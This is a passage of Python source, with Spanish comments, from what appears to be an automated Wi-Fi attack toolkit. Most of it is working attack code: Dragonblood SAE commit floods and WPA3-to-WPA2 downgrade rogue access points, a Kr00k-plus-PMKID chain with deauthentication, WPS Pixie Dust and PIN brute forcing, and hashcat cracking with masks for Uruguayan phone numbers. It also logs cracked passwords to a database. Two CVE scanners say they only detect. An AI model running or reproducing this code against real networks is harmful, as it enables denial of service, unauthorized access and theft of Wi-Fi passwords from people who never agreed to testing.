                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            p1.wait()
        except KeyboardInterrupt:
            pass
        run("pkill hostapd 2>/dev/null; pkill dnsmasq 2>/dev/null")
    pause_back()

# ─────────────────────────────────────────────────────────────────────────────
# CVE-2019-9494/9496 — Dragonblood mejorado con timing + DoS
# ─────────────────────────────────────────────────────────────────────────────
def _cve_dragonblood_plus():
    """Dragonblood WPA3-SAE: timing side-channel + cache attack + SAE DoS."""
    separador("Dragonblood WPA3-SAE — CVE-2019-9494/9496 Mejorado")
    print(f"""
  {WHITE}Dragonblood incluye:{END}
  {DIM}• CVE-2019-9494: Timing side-channel en SAE Commit
    → Mide tiempo de respuesta para adivinar bits de la contraseña
  • CVE-2019-9496: Cache-based side-channel en SAE Confirm
    → Observa patrones de acceso a caché para recuperar clave
  • SAE Denial of Service: flood de SAE Commit sin recurso
    → Satura el AP con commits costosos computacionalmente
  • Downgrade: forzar WPA3 → WPA2 en redes de transición{END}
    """)
    print(f"  {WHITE}[1]{END} SAE DoS (flood de commits — más práctico)")
    print(f"  {WHITE}[2]{END} Timing side-channel (requiere dragonslayer)")
    print(f"  {WHITE}[3]{END} Downgrade WPA3 SAE → WPA2 PSK")
    print(f"  {WHITE}[4]{END} Detectar APs WPA3 vulnerables en zona\n")
    sub = ask("Seleccione")

    interfaz = select_interface()

    if sub == "4":
        # Solo detección
        info("Escaneando redes WPA3 en zona...")
        redes = quick_scan(interfaz, 20)
        wpa3_nets = [r for r in redes if "WPA3" in r.get("privacy","").upper()]
        if not wpa3_nets:
            info("No se detectaron redes WPA3 en rango.")
        else:
            separador("REDES WPA3 DETECTADAS")
            for r in wpa3_nets:
                mixed = "WPA3+WPA2" if "WPA2" in r.get("privacy","").upper() else "WPA3 puro"
                vuln  = f"{YELLOW}posible downgrade{END}" if "WPA2" in r.get("privacy","").upper() else f"{GREEN}solo WPA3{END}"
                print(f"  {CYAN}{r['essid']:<26}{END} {DIM}{r['bssid']}{END} — {mixed} — {vuln}")
        pause_back(); return

    bssid, channel, essid = select_target_from_scan(interfaz)
    if not bssid: pause_back(); return

    if sub == "1":
        # SAE Commit flood con mdk4 o scapy
        separador("SAE COMMIT FLOOD — DoS WPA3")
        info(f"Inundando {essid} con SAE Commit frames...")
        tip("Cada commit requiere cálculo de curva elíptica en el AP → lo satura.")
        db_log_attack("Dragonblood SAE DoS", essid, bssid, channel, "activo")
        if check_tool("mdk4"):
            warn("Iniciando flood con mdk4. CTRL+C para detener.")
            try:
                run(f"mdk4 {interfaz} s -t {bssid} 2>/dev/null")
            except KeyboardInterrupt:
                pass
        else:
            try:
                from scapy.all import RadioTap, Dot11, Dot11Auth, sendp
                ok("Enviando SAE Commit frames con scapy...")
                warn("CTRL+C para detener.")
                auth_frame = (RadioTap() /
                              Dot11(type=0, subtype=11,
                                    addr1=bssid, addr2="00:11:22:33:44:55", addr3=bssid) /
                              Dot11Auth(algo=3, seqnum=1, status=0))  # algo=3 SAE
                try:
                    sendp(auth_frame, iface=interfaz, loop=1, inter=0.001, verbose=False)
                except KeyboardInterrupt:
                    pass
            except ImportError:
                error("scapy no disponible: pip3 install scapy")

    elif sub == "2":
        if check_tool("dragonslayer"):
            info("Ejecutando dragonslayer (timing side-channel)...")
            tip("Mide tiempos de respuesta SAE para deducir bits de la clave.")
            run(f"dragonslayer -i {interfaz} -b {bssid} -e {essid} -c {channel}")
            db_log_attack("Dragonblood Timing", essid, bssid, channel, "ejecutado")
        else:
            warn("dragonslayer no instalado.")
            tip("git clone https://github.com/vanhoefm/dragonslayer")
            tip("El timing attack requiere múltiples mediciones y análisis estadístico.")

    elif sub == "3":
        info("Lanzando AP WPA2 para downgrade de clientes WPA3...")
        _cve_ssid_confusion_plus.__doc__  # reusar lógica downgrade
        os.makedirs("/tmp/herradura_dragondown", exist_ok=True)
        with open("/tmp/herradura_dragondown/hostapd.conf","w") as f:
            f.write(f"interface={interfaz}\ndriver=nl80211\nssid={essid}\n"
                    f"hw_mode=g\nchannel={channel}\nwpa=2\n"
                    f"wpa_passphrase=placeholder\nwpa_key_mgmt=WPA-PSK\n"
                    f"wpa_pairwise=CCMP\nmacaddr_acl=0\n")
        info(f"AP WPA2 '{essid}' activo. Clientes WPA3/WPA2 mixed pueden hacer downgrade.")
        warn("CTRL+C para detener.")
        db_log_attack("Dragonblood Downgrade", essid, bssid, channel, "activo")
        try:
            subprocess.run(["hostapd","/tmp/herradura_dragondown/hostapd.conf"])
        except KeyboardInterrupt:
            pass
        run("pkill hostapd 2>/dev/null")
    pause_back()

# ─────────────────────────────────────────────────────────────────────────────
# Kr00k + PMKID encadenados
# ─────────────────────────────────────────────────────────────────────────────
def _cve_kr00k_pmkid_chain():
    """Kr00k + PMKID: si Kr00k no funciona, escala automáticamente a PMKID."""
    separador("Kr00k + PMKID — ATAQUE ENCADENADO")
    print(f"""
  {DIM}Estrategia: intentar Kr00k primero (si el chip es Broadcom/Cypress).
  Si no hay frames descifrados, escalar a PMKID automáticamente.
  PMKID tampoco requiere clientes y funciona en WPA2/WPA3.{END}
    """)
    interfaz = select_interface()
    bssid, channel, essid = select_target_from_scan(interfaz)
    if not bssid: pause_back(); return

    essid_s  = re.sub(r'[^\w\-]','_', essid)
    os.makedirs("kr00k", exist_ok=True)
    os.makedirs("scan-output", exist_ok=True)

    step(1,"Kr00k: disassoc + captura con clave nula")
    cap_f  = f"kr00k/{essid_s}_chain.pcap"
    cap_p  = subprocess.Popen(f"tcpdump -i {interfaz} -w {cap_f} 2>/dev/null", shell=True)
    time.sleep(2)
    for _ in range(6):
        run(f"aireplay-ng -0 2 -a {bssid} {interfaz} 2>/dev/null")
        time.sleep(0.4)
    time.sleep(2)
    cap_p.terminate()

    null_key = "00"*16
    dec_f    = cap_f.replace(".pcap","-dec.pcap")
    kr00k_ok = False
    if os.path.exists(cap_f) and os.path.getsize(cap_f) > 100:
        run(f"airdecap-ng -l -b {bssid} -k {null_key} {cap_f} 2>/dev/null")
        if os.path.exists(dec_f) and os.path.getsize(dec_f) > 0:
            ok(f"Kr00k exitoso: {dec_f}")
            kr00k_ok = True
            db_log_attack("Kr00k+PMKID chain", essid, bssid, channel, f"kr00k_ok:{dec_f}", dec_f)

    if not kr00k_ok:
        warn("Kr00k no exitoso. Escalando a PMKID...")
        step(2,"PMKID: captura hash sin clientes")
        pmkid_f = f"scan-output/{essid_s}_chain.pcapng"
        hc_f    = f"scan-output/{essid_s}_chain.hc22000"
        progress_bar(35, f"PMKID {essid}")
        run(f"timeout 35 hcxdumptool -i {interfaz} -o {pmkid_f} "
            f"--filterlist_ap={bssid} --filtermode=2 --active_beacon 2>/dev/null")
        if check_tool("hcxpcapngtool") and os.path.exists(pmkid_f):
            run(f"hcxpcapngtool -o {hc_f} {pmkid_f} 2>/dev/null")
        if os.path.exists(hc_f) and os.path.getsize(hc_f)>0:
            ok(f"Hash PMKID capturado: {hc_f}")
            step(3,"Crackear hash")
            wl = select_wordlist()
            if wl and check_tool("hashcat"):
                best64 = next((p for p in ["/usr/share/hashcat/rules/best64.rule",
                               "/usr/share/doc/hashcat/rules/best64.rule"] if os.path.exists(p)),"")
                run(f"hashcat -m 22000 {hc_f} {wl} {f'-r {best64}' if best64 else ''} "
                    f"--force --status --status-timer=10")
                pot = run(f"hashcat --show -m 22000 {hc_f} 2>/dev/null", capture=True) or ""
                pm  = re.search(r':(.+)$', pot, re.MULTILINE)
                if pm:
                    clave = pm.group(1).strip()
                    ok(f"CONTRASEÑA: {GREEN}{clave}{END}")
                    aid = db_log_attack("Kr00k+PMKID chain", essid, bssid, channel,
                                        f"crackeada:{clave}", hc_f)
                    db_log_password(aid, essid, bssid, clave, "PMKID chain")
        else:
            warn("PMKID tampoco obtuvo hash. El AP puede tener protecciones activas.")
    pause_back()

# ─────────────────────────────────────────────────────────────────────────────
# Scanner CVE-2024-30078 — Detección Windows WiFi Driver RCE (SIN exploit)
# ─────────────────────────────────────────────────────────────────────────────
def _cve_scanner_win_30078():
    """Detectar dispositivos Windows potencialmente vulnerables a CVE-2024-30078."""
    separador("SCANNER CVE-2024-30078 — Windows WiFi Driver RCE")
    print(f"""
  {WHITE}CVE-2024-30078{END} — Parcheado por Microsoft en Junio 2024:
  {DIM}Heap buffer overflow en el driver WiFi de Windows (wifiutil.dll).
  Permite RCE sin autenticación en el mismo segmento WiFi.
  Afecta: Windows 10/11 y Windows Server sin parche KB5039211+.

  {YELLOW}NOTA:{END} {DIM}Este módulo realiza DETECCIÓN pasiva únicamente.
  No se implementa el payload RCE. La explotación activa de este CVE
  constituye acceso no autorizado a sistemas ajenos.{END}

  {WHITE}Detección basada en:{END}
  {DIM}• Fingerprinting del stack WiFi por probe responses
  • Análisis de beacon capabilities específicas de drivers Windows
  • Correlación con OUI de Intel/Broadcom (comunes en portátiles Windows)
  • Detección de versión de driver por Information Elements 802.11{END}
    """)

    interfaz = select_interface()
    t = ask("Tiempo de captura para fingerprinting (recomendado: 30s)")
    try: t = max(15, min(int(t), 120))
    except ValueError: t = 30

    os.makedirs("cve_scans", exist_ok=True)
    cap_f = "cve_scans/win_30078_scan.pcap"

    info(f"Capturando probe responses y beacons durante {t}s...")
    tip("Busca dispositivos Windows no parcheados por características del driver.")

    if check_tool("tcpdump"):
        run(f"timeout {t} tcpdump -i {interfaz} -w {cap_f} "
            f"'type mgt subtype probe-resp or type mgt subtype beacon' 2>/dev/null")
    else:
        run(f"timeout {t} airodump-ng --write cve_scans/win_30078 "
            f"--output-format pcap {interfaz} 2>/dev/null")
        cap_f = "cve_scans/win_30078-01.cap"

    vulnerable_candidates = []

    if check_tool("tshark") and os.path.exists(cap_f):
        sp = Spinner("Analizando frames con tshark...")
        sp.start()
        # Extraer MACs + IEs (Information Elements) de probe requests de clientes
        raw = run(
            f"tshark -r {cap_f} -Y 'wlan.fc.type_subtype==0x04' "
            f"-T fields -e wlan.sa -e wlan.ssid -e wlan.tag.vendor.oui "
            f"-e wlan.tag.ext_capabilities 2>/dev/null | sort -u",
            capture=True
        ) or ""
        sp.stop()

        # OUIs comunes en chips WiFi de portátiles Windows
        windows_ouis = {
            "3c:a9:f4": "Intel Wireless-AC",
            "8c:8d:28": "Intel Wi-Fi 6",
            "04:ea:56": "Intel Wi-Fi 6E",
            "d4:3b:04": "Intel Wi-Fi 6",
            "1c:69:7a": "Intel Wireless",
            "f4:8c:eb": "Realtek (común en Windows)",
            "00:13:02": "Intel PRO/Wireless",
            "00:15:00": "Intel WiFi",
            "ac:bc:32": "Apple (reference)",
        }

        seen_macs = set()
        for line in raw.splitlines():
            parts = line.strip().split("\t")
            if not parts or not parts[0]: continue
            mac = parts[0].strip().lower()
            if not validate_bssid(mac.replace("-",":")) or mac in seen_macs:
                continue
            seen_macs.add(mac)
            oui = mac[:8]
            vendor = windows_ouis.get(oui, "")
            ssids  = parts[1].strip() if len(parts) > 1 else ""
            ext_cap = parts[3].strip() if len(parts) > 3 else ""

            # Heurística: Intel OUI + probe requests = muy probablemente Windows
            is_windows_likely = bool(vendor and "Intel" in vendor) or "Realtek" in vendor
            # Extended capabilities byte 4 bit 6 = 802.11ac (común en Win10/11)
            has_ac = "ac" in ext_cap.lower() or "6" in vendor.lower()

            if is_windows_likely or "Intel" in vendor:
                risk = f"{RED}ALTO — potencialmente vulnerable{END}" if "Intel" in vendor else f"{YELLOW}MEDIO{END}"
                vulnerable_candidates.append({
                    "mac": mac, "vendor": vendor or "Desconocido",
                    "ssids": ssids, "risk": risk, "ext": ext_cap
                })

    separador("DISPOSITIVOS POTENCIALMENTE VULNERABLES")
    if vulnerable_candidates:
        print(f"  {WHITE}{'MAC':<20} {'CHIP/DRIVER':<28} {'RIESGO'}{END}")
        separador()
        for c in vulnerable_candidates:
            print(f"  {CYAN}{c['mac']:<20}{END} {YELLOW}{c['vendor'][:26]:<28}{END} {c['risk']}")
            if c['ssids']:
                print(f"    {DIM}Redes buscadas: {c['ssids'][:60]}{END}")
        print()
        ok(f"{len(vulnerable_candidates)} dispositivos candidatos detectados.")
        info("Para verificar si están parcheados, compruebe que tengan KB5039211 (Jun 2024).")
        tip("Un sistema parcheado actualiza wifiutil.dll a versión 10.0.22621.3810+")
        tip("IMPORTANTE: Este scanner solo detecta — no explota el CVE.")
        # Guardar en BD
        for c in vulnerable_candidates:
            db_log_device(c['mac'], c['mac'], c['vendor'], "WiFi client",
                          "", f"CVE-2024-30078 candidate: {c['risk']}")
    else:
        info("No se detectaron candidatos con perfil de Windows en este escaneo.")
        tip("Pruebe en un entorno con más dispositivos Windows o aumente el tiempo.")
    pause_back()

# ─────────────────────────────────────────────────────────────────────────────
# Scanner CVE-2024-21820/21821 — Detección Intel WiFi drivers
# ─────────────────────────────────────────────────────────────────────────────
def _cve_scanner_intel_2024():
    """Detectar dispositivos con drivers Intel WiFi vulnerables CVE-2024-21820/21821."""
    separador("SCANNER CVE-2024-21820/21821 — Intel WiFi Drivers")
    print(f"""
  {WHITE}CVE-2024-21820 / CVE-2024-21821{END} — Intel WiFi:
  {DIM}• CVE-2024-21820: Escalada de privilegios en driver Intel WiFi
    Afecta Intel PROSet/Wireless < 23.20.0 en Windows
  • CVE-2024-21821: RCE en firmware de chips Intel Wi-Fi 6/6E
    Afecta chips AX200, AX201, AX210, AX211, AX411

  {YELLOW}NOTA:{END} Este módulo realiza DETECCIÓN pasiva por fingerprinting.
  No se incluye payload de explotación.{END}

  {WHITE}Detección:{END} {DIM}Por OUI de Intel + probe requests + IE vendor-specific{END}
    """)

    interfaz = select_interface()
    t = ask("Tiempo de captura (recomendado: 25s)")
    try: t = max(10, min(int(t), 90))
    except ValueError: t = 25

    info(f"Escaneando dispositivos Intel WiFi durante {t}s...")
    os.makedirs("cve_scans", exist_ok=True)

    # OUIs de chips Intel WiFi 6/6E/7 (vulnerables)
    intel_vulnerable_ouis = {
        "3c:a9:f4": ("Intel Wi-Fi 6 AX200",    "CVE-2024-21820/21821"),
        "8c:8d:28": ("Intel Wi-Fi 6 AX201",    "CVE-2024-21820/21821"),
        "04:ea:56": ("Intel Wi-Fi 6E AX210",   "CVE-2024-21821"),
        "d4:3b:04": ("Intel Wi-Fi 6 AX201",    "CVE-2024-21820"),
        "1c:69:7a": ("Intel Wireless-AC 9260",  "CVE-2024-21820"),
        "00:13:02": ("Intel PRO/Wireless 3945", "posible CVE-2024-21820"),
        "e8:6a:64": ("Intel Wi-Fi 6E AX211",   "CVE-2024-21821"),
        "a4:c3:f0": ("Intel Wi-Fi 7 BE200",    "CVE-2024-21821"),
    }

    raw = ""
    if check_tool("tshark"):
        progress_bar(t, "Fingerprinting Intel")
        raw = run(
            f"tshark -i {interfaz} -a duration:{t} "
            f"-Y 'wlan.fc.type_subtype==0x04 or wlan.fc.type_subtype==0x05' "
            f"-T fields -e wlan.sa -e wlan.tag.vendor.oui "
            f"-e wlan.ht.capabilities -e wlan.vht.capabilities "
            f"2>/dev/null",
            capture=True
        ) or ""
    else:
        out_base = "cve_scans/intel_scan"
        run(f"rm -f {out_base}-01.csv 2>/dev/null")
        progress_bar(t, "Escaneando")
        run(f"timeout {t} airodump-ng --write {out_base} "
            f"--output-format csv {interfaz} 2>/dev/null")
        csv_f = f"{out_base}-01.csv"
        if os.path.exists(csv_f):
            with open(csv_f,"r",errors="ignore") as f:
                raw = f.read()

    results = []
    seen = set()
    for line in raw.splitlines():
        parts = line.strip().split("\t") if "\t" in line else line.split(",")
        if not parts: continue
        mac_raw = parts[0].strip().lower().replace("-",":")
        if not validate_bssid(mac_raw) or mac_raw in seen: continue
        seen.add(mac_raw)
        oui = mac_raw[:8]
        if oui in intel_vulnerable_ouis:
            chip, cve_ref = intel_vulnerable_ouis[oui]
            # VHT/HE capabilities detectadas = chip más moderno = más probable AX
            has_he  = any("he" in p.lower() for p in parts[2:])
            has_vht = any(p.strip() for p in parts[2:] if p.strip())
            version_hint = "AX (Wi-Fi 6/6E)" if has_he else ("AC (Wi-Fi 5)" if has_vht else "")
            results.append({
                "mac": mac_raw, "chip": chip, "cve": cve_ref,
                "hint": version_hint
            })

    separador("DISPOSITIVOS INTEL WiFi DETECTADOS")
    if results:
        print(f"  {WHITE}{'MAC':<20} {'CHIP':<26} {'CVE':<22} {'VERSIÓN'}{END}")
        separador()
        for r in results:
            print(f"  {CYAN}{r['mac']:<20}{END} {YELLOW}{r['chip']:<26}{END} "
                  f"{RED}{r['cve']:<22}{END} {DIM}{r['hint']}{END}")
        print()
        ok(f"{len(results)} dispositivos Intel con drivers potencialmente vulnerables.")
        warn("Verificar: Intel PROSet/Wireless >= 23.20.0 parchea CVE-2024-21820")
        warn("Verificar: Firmware AX210/AX211 >= 86.10.0.2 parchea CVE-2024-21821")
        tip("Página de parches Intel: intel.com/content/www/us/en/security-center/advisory/intel-sa-01101.html")
        for r in results:
            db_log_device(r['mac'], r['mac'], r['chip'], "Intel WiFi client",
                          "", f"{r['cve']} candidate")
    else:
        info("No se detectaron chips Intel en el rango de captura.")
        tip("Aumente el tiempo o escanee en un entorno con más dispositivos.")
    pause_back()

# ═════════════════════════════════════════════════════════════════════════════
#  MÓDULO 35 — EXPLOIT ENGINE: Auto-exploit con progreso en tiempo real
# ═════════════════════════════════════════════════════════════════════════════

# PIN WPS más frecuentes estadísticamente (Pixie fallback antes de brute full)
_TOP_WPS_PINS = [
    "12345670","00000000","11111111","20172527","10864223","86253137",
    "04412061","01234567","36158981","68175542","10028155","01230926",
    "34618879","55544433","07083922","35965010","77777777","99999999",
    "88888888","66666666","55555555","44444444","33333333","22222222",
    "12340000","00001234","11110000","00001111","12341234","43218765",
]

def smart_exploit_target(eng: ExploitEngine) -> tuple:
    """
    Motor de explotación completo con progreso en tiempo real.
    Retorna (clave_o_None, metodo_str).
    Fases:
      0 – Fingerprint + CVE detection     ( 8 %)
      1 – WPS Pixie Dust                  (12 %)
      2 – WPS Smart PIN + brute parcial   ( 8 %)
      3 – PMKID capture + hashcat         (18 %)
      4 – Handshake capture + deauth      (15 %)
      5 – Cracking multi-regla + SSID wl  (15 %)
      6 – Ataque de mascaras hashcat      (10 %)
      7 – WPS Brute Force (bully+reaver)  ( 7 %)
      8 – PMKID retry extendido 90s       ( 5 %)
      9 – Evil Twin + portal cautivo      (13 %)
    """
    bssid    = eng.bssid
    channel  = eng.channel
    essid    = eng.essid
    iface    = eng.interfaz
    wordlist = eng.wordlist
    essid_s  = re.sub(r'[^\w\-]', '_', essid)

    # Fases con pesos calibrados
    eng.add_phase("Fingerprint & CVE detect",  5)
    eng.add_phase("WPS Pixie Dust",            15)
    eng.add_phase("WPS Smart PIN",             18)
    eng.add_phase("PMKID capture + hashcat",   15)
    eng.add_phase("Handshake capture + deauth",12)
    eng.add_phase("Crack multi-reglas",        13)
    eng.add_phase("Mask attack",               10)
    eng.add_phase("WPS Brute Force",            7)
    eng.add_phase("PMKID retry",                5)
    eng.add_phase("Evil Twin",                  5)

    eng.start()

    # ── FASE 0: Fingerprint ────────────────────────────────────────────────────
    eng.set_phase(0, 5)
    os.makedirs("exploit-engine", exist_ok=True)

    # Detectar privacidad del objetivo
    priv_raw = run(
        f"timeout 8 airodump-ng -c {channel} --bssid {bssid} "
        f"--output-format csv --write exploit-engine/_fp_{essid_s} {iface} 2>/dev/null",
        capture=True
    ) or ""
    eng.update_phase(30)

    # Leer CSV para obtener privacidad actualizada
    priv = "WPA2"
    csv_fp = f"exploit-engine/_fp_{essid_s}-01.csv"
    if os.path.exists(csv_fp):
        with open(csv_fp, "r", errors="ignore") as _f:
            for _row in csv.reader(_f):
                if len(_row) > 5 and bssid.lower() in _row[0].lower():
                    priv = _row[5].strip().upper() if len(_row) > 5 else priv
                    break
    eng.update_phase(55)

    # CVE fingerprint: detectar WPS
    has_wps = False
    if check_tool("wash"):
        wash_out = run(f"timeout 10 wash -i {iface} 2>/dev/null", capture=True) or ""
        has_wps = bssid.lower() in wash_out.lower()
    eng.update_phase(80)

    # Detectar chipset Broadcom/Cypress (Kr00k)
    vendor = ""
    try:
        oui = bssid.upper().replace(":", "").replace("-", "")[:6]
        resp = urllib.request.urlopen(
            f"https://api.macvendors.com/{bssid}", timeout=3
        ).read().decode()
        vendor = resp.strip()
    except Exception:
        pass
    kr00k_suspect = any(k in vendor.upper() for k in ["BROADCOM","CYPRESS","APPLE","AMAZON"])
    eng.update_phase(100)

    # ── FASE 1: WPS Pixie Dust ─────────────────────────────────────────────────
    eng.set_phase(1, 0)
    clave = None; metodo = None

    if has_wps and check_tool("reaver"):
        for pct_step, _ in enumerate(range(0, 90, 15), 1):
            eng.update_phase(pct_step * 15)
            time.sleep(0.1)
        pixie_out = run(
            f"timeout 90 reaver -i {iface} -b {bssid} -c {channel} "
            f"-K 1 -N -vv 2>&1", capture=True
        ) or ""
        psk_m = None
        for _psk_pat in [r'WPA PSK[:\s]+["\']?([^\s"\']{6,})', r'WPA2 Password[:\s]+(.+)', r'Passphrase[:\s]+["\'](.+?)["\']']:
            psk_m = re.search(_psk_pat, pixie_out, re.I)
            if psk_m: break
        if psk_m:
            clave  = psk_m.group(1)
            metodo = "WPS Pixie Dust (CVE)"
            eng.done(clave, metodo)
            return clave, metodo
    eng.update_phase(100)

    # ── FASE 2: WPS Smart PIN ──────────────────────────────────────────────────
    eng.set_phase(2, 0)
    if has_wps and check_tool("reaver") and not clave:
        total_pins = len(_TOP_WPS_PINS)
        for pi, pin in enumerate(_TOP_WPS_PINS):
            eng.update_phase(int(pi / total_pins * 90))
            pin_out = run(
                f"timeout 12 reaver -i {iface} -b {bssid} -c {channel} "
                f"-p {pin} -N -S 2>&1", capture=True
            ) or ""
            psk_m = re.search(r'WPA PSK[:\s]+["\']?([^\s"\']{6,})', pin_out, re.I)
            if psk_m:
                clave  = psk_m.group(1)
                metodo = f"WPS PIN {pin}"
                eng.done(clave, metodo)
                return clave, metodo
    eng.update_phase(100)

    # ── FASE 3: PMKID ─────────────────────────────────────────────────────────
    eng.set_phase(3, 0)
    pmkid_hc = None
    if "WPA2" in priv or "WPA3" in priv:
        if check_tool("hcxdumptool"):
            pcap = f"exploit-engine/pmkid_{essid_s}.pcapng"
            hc22 = f"exploit-engine/pmkid_{essid_s}.hc22000"
            run(f"rm -f {pcap} {hc22} 2>/dev/null")
            # Captura con association frames activos
            eng.update_phase(5)
            capture_proc = subprocess.Popen(
                f"hcxdumptool -i {iface} -o {pcap} "
                f"--filterlist_ap={bssid} --filtermode=2 "
                f"--active_beacon --enable_status=3 2>/dev/null",
                shell=True,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            # Progreso durante captura (90s — más tiempo = más probabilidad de PMKID)
            for tick in range(90):
                eng.update_phase(5 + int(tick / 90 * 45))
                time.sleep(1)
            capture_proc.terminate(); capture_proc.wait()
            eng.update_phase(55)

            if os.path.exists(pcap) and check_tool("hcxpcapngtool"):
                run(f"hcxpcapngtool -o {hc22} {pcap} 2>/dev/null", capture=True)
            if os.path.exists(hc22) and os.path.getsize(hc22) > 0:
                pmkid_hc = hc22
                ok(f"PMKID capturado: {hc22}")
            eng.update_phase(65)

            if pmkid_hc and check_tool("hashcat"):
                # Construir lista de reglas disponibles
                rules_paths = [
                    "/usr/share/hashcat/rules/best64.rule",
                    "/usr/share/doc/hashcat/rules/best64.rule",
                    "/usr/share/hashcat/rules/rockyou-30000.rule",
                    "/usr/share/hashcat/rules/dive.rule",
                ]
                available_rules = [r for r in rules_paths if os.path.exists(r)]
                rule_arg = f"-r {available_rules[0]}" if available_rules else ""

                # Generar wordlist SSID primero
                ssid_wl = f"exploit-engine/ssid_{essid_s}.txt"
                _gen_ssid_wordlist(essid, ssid_wl, bssid)

                # Crackear PMKID: 1) SSID wordlist 2) wordlist principal
                for wl in [ssid_wl, wordlist]:
                    if not wl or not os.path.exists(wl): continue
                    run(f"hashcat -m 22000 {pmkid_hc} {wl} {rule_arg} "
                        f"--force --quiet 2>/dev/null")
                    pot = run(f"hashcat --show -m 22000 {pmkid_hc} 2>/dev/null",
                              capture=True) or ""
                    pm = re.search(r':([^:\n]+)$', pot, re.MULTILINE)
                    if pm:
                        clave  = pm.group(1).strip()
                        metodo = "PMKID + hashcat"
                        eng.done(clave, metodo)
                        return clave, metodo
                eng.update_phase(95)
    eng.update_phase(100)

    # ── FASE 4: Handshake + Deauth agresivo ────────────────────────────────────
    eng.set_phase(4, 0)
    cap_file = None
    if "WPA" in priv:
        hs_base = f"exploit-engine/hs_{essid_s}"
        run(f"rm -f {hs_base}*.cap {hs_base}*.csv 2>/dev/null")

        # Lanzar airodump en background
        cap_proc = subprocess.Popen(
            f"airodump-ng -c {channel} --bssid {bssid} -w {hs_base} {iface} 2>/dev/null",
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        eng.update_phase(10)
        time.sleep(6)  # dar tiempo al airodump para sincronizar

        # 5 rondas de deauth (3 paquetes cada ronda) con pausa entre rondas
        for round_n in range(5):
            eng.update_phase(10 + round_n * 15)
            run(f"aireplay-ng -0 3 -a {bssid} {iface} 2>/dev/null",
                capture=True)
            time.sleep(2)  # pausa para que el cliente se reconecte
            # Verificar si ya hay handshake
            cap_list = [f for f in os.listdir("exploit-engine")
                        if f.startswith(f"hs_{essid_s}") and f.endswith(".cap")]
            if cap_list:
                _cap = f"exploit-engine/{cap_list[-1]}"
                chk = run(f"aircrack-ng {_cap} 2>/dev/null | grep -i handshake",
                          capture=True) or ""
                if "handshake" in chk.lower():
                    cap_file = _cap
                    break

        cap_proc.terminate(); cap_proc.wait()
        eng.update_phase(85)

        if not cap_file:
            cap_list = [f for f in os.listdir("exploit-engine")
                        if f.startswith(f"hs_{essid_s}") and f.endswith(".cap")]
            if cap_list:
                cap_file = f"exploit-engine/{cap_list[-1]}"
    eng.update_phase(100)

    # ── FASE 5: Cracking multi-herramienta ────────────────────────────────────
    eng.set_phase(5, 0)
    if cap_file and os.path.exists(cap_file):
        ssid_wl = f"exploit-engine/ssid_{essid_s}.txt"
        _gen_ssid_wordlist(essid, ssid_wl)
        hc_file = cap_file.replace(".cap", ".hc22000")
        if check_tool("hcxpcapngtool"):
            run(f"hcxpcapngtool -o {hc_file} {cap_file} 2>/dev/null", capture=True)
        eng.update_phase(10)

        rules_paths = [
            "/usr/share/hashcat/rules/best64.rule",
            "/usr/share/doc/hashcat/rules/best64.rule",
            "/usr/share/hashcat/rules/rockyou-30000.rule",
        ]
        available_rules = [r for r in rules_paths if os.path.exists(r)]

        # Ronda 1: SSID wordlist (rápido, sin reglas)
        if os.path.exists(ssid_wl) and check_tool("hashcat") and \
                os.path.exists(hc_file) and os.path.getsize(hc_file) > 0:
            eng.update_phase(20)
            run(f"hashcat -m 22000 {hc_file} {ssid_wl} --force --quiet 2>/dev/null")
            pot = run(f"hashcat --show -m 22000 {hc_file} 2>/dev/null", capture=True) or ""
            pm = re.search(r':([^:\n]+)$', pot, re.MULTILINE)
            if pm:
                clave = pm.group(1).strip(); metodo = "Handshake + SSID wordlist"
                eng.done(clave, metodo); return clave, metodo

        # Ronda 2: wordlist principal + reglas
        eng.update_phase(35)
        if check_tool("hashcat") and os.path.exists(hc_file) and \
                os.path.getsize(hc_file) > 0 and os.path.exists(wordlist):
            for ri, rule in enumerate(available_rules or [""]):
                eng.update_phase(35 + ri * 15)
                rf = f"-r {rule}" if rule else ""
                run(f"hashcat -m 22000 {hc_file} {wordlist} {rf} "
                    f"--force --quiet 2>/dev/null")
                pot = run(f"hashcat --show -m 22000 {hc_file} 2>/dev/null",
                          capture=True) or ""
                pm = re.search(r':([^:\n]+)$', pot, re.MULTILINE)
                if pm:
                    clave = pm.group(1).strip()
                    metodo = f"Handshake + hashcat ({os.path.basename(rule) if rule else 'sin regla'})"
                    eng.done(clave, metodo); return clave, metodo

        # Ronda 3: aircrack-ng fallback
        eng.update_phase(80)
        if check_tool("aircrack-ng") and os.path.exists(wordlist):
            ac_out = run(
                f"aircrack-ng {cap_file} -w {wordlist} 2>/dev/null",
                capture=True
            ) or ""
            _wep_key = None
            for _pat in [r'KEY FOUND.*?\[\s*(.+?)\s*\]', r'KEY FOUND[:\s]+([0-9A-Fa-f:]{5,})', r'(\b(?:[0-9A-Fa-f]{2}:){4}[0-9A-Fa-f]{2}\b)']:
                _wm = re.search(_pat, ac_out, re.I)
                if _wm:
                    _wep_key = _wm.group(1).strip()
                    break
            km = _wep_key
            if km:
                clave = km; metodo = "Handshake + aircrack-ng"
                eng.done(clave, metodo); return clave, metodo
        eng.update_phase(100)

    # ── FASE 6: Ataque de máscaras (hashcat -a 3) ─────────────────────────────
    eng.set_phase(6, 0)
    # Buscar cualquier hash disponible (PMKID o handshake convertido)
    _hash_files = []
    for _f in os.listdir("exploit-engine"):
        if _f.endswith(".hc22000") and essid_s in _f:
            _path = f"exploit-engine/{_f}"
            if os.path.exists(_path) and os.path.getsize(_path) > 0:
                _hash_files.append(_path)
    # Máscaras comunes para contraseñas WPA en Uruguay/LATAM
    _MASKS = [
        ("8 digitos",          "?d?d?d?d?d?d?d?d"),
        ("9 digitos",          "?d?d?d?d?d?d?d?d?d"),
        ("10 digitos",         "?d?d?d?d?d?d?d?d?d?d"),
        ("8 minusculas",       "?l?l?l?l?l?l?l?l"),
        ("mayus+7 minus",      "?u?l?l?l?l?l?l?l"),
        ("mayus+6 minus+dig",  "?u?l?l?l?l?l?l?d"),
        ("palabra+4 digitos",  "?l?l?l?l?d?d?d?d"),
        ("telefono UY 09x",    "09?d?d?d?d?d?d"),
        ("telefono UY 2xxx",   "2?d?d?d?d?d?d?d"),
    ]
    if _hash_files and check_tool("hashcat"):
        _hf = _hash_files[0]
        for mi, (mask_name, mask) in enumerate(_MASKS):
            eng.update_phase(int(mi / len(_MASKS) * 95))
